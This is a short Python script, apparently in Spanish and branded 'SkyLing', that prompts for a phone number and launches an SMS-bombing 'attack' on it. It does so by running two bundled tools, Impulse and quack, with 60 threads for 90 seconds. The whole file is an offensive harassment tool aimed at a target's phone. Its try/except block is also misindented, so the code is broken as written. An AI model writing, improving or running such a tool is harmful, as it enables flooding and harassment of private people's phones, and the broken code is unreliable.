import os
import colorama
from colorama import Fore,init
from colorama import Fore, Style
from time import sleep
verde = Fore.GREEN
c = Fore.CYAN
rojo = Fore.RED
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
b = Fore.WHITE
reset = Fore.RESET
a = Fore.YELLOW
blue = Fore.BLUE
os.system("clear")

banner = f"""
{c}  ██████  ███▄ ▄███▓  ██████   ██████  ██▓███   ███▄ ▄███▓
{c}▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒ ▒██    ▒ ▓██░  ██▒▓██▒▀█▀ ██▒
{b}░ ▓██▄   ▓██    ▓██░░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▓██    ▓██░
{b}  ▒   ██▒▒██    ▒██   ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██    ▒██ 
{c}▒██████▒▒▒██▒   ░██▒▒██████▒▒▒██████▒▒▒██▒ ░  ░▒██▒   ░██▒
{c}▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░   ░  ░
{c}░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░     ░  ░      ░
{c}░  ░  ░  ░      ░   ░  ░  ░  ░  ░  ░  ░░       ░      ░   
{c}      ░         ░         ░        ░                  ░   
{blue}                                           💣  SkyLing  💣                                                       
"""
print (banner)
print ("EJEMPLO: +5491189898989")
try:
    numero = int(input(f"{a}Numero:{reset} "))
except ValueError:
    print ("incorrecto, porfavor vuelva a intentarlo")
    numero = int(input(f"{a}Numero:{reset} "))
sleep(1.5)
print (f"comenzando el ataque al numero: {numero}")
def attack():
    os.system("clear")
    msj = "Comenzando ataque..."
    print (verde+msj)
    print (reset+"")
    sleep(2)
    try:
        os.system(f"cd ataque && cd quack && cd Impulse && python impulse.py --method SMS --time 90 --threads 60 --target {numero}")
        os.system(f"cd ataque && cd quack && cd quack && python quack --tool SMS --target {numero} --threads 60 --timeout 90")
        print ("ataque terminado.")
   except KeyboardInterrupt:
        print (rojo+"finalizando el spam de sms...")
attack()
